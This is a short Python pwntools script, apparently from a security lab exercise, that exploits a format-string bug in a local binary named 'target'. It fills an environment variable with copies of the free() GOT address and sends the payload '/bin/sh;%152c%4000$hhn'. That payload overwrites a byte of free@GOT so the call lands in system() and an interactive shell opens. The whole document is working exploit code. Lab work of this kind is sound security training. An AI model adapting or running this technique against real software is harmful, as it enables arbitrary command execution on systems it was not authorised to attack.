from pwn import *

context.terminal = ["tmux", "split-window", "-h"]
TARGET = "/home/lab08/fsb-heap/target"

elf = ELF(TARGET)

free_got = elf.got["free"]  # free_plt + 6 
system_plt = elf.plt["system"] # 0x80490a0 -> 0x8049066 (free_got)
# print(hex(system_plt))

print("expect:", hex(free_got))

env ={
    "FREE" : p32(free_got) * 10000 + b"XXX" # allign
}

p = process([TARGET], env=env)
offset = 4000

payload = b"/bin/sh;"
payload += b"%152c%4000$hhn"

p.sendline(payload)
p.interactive()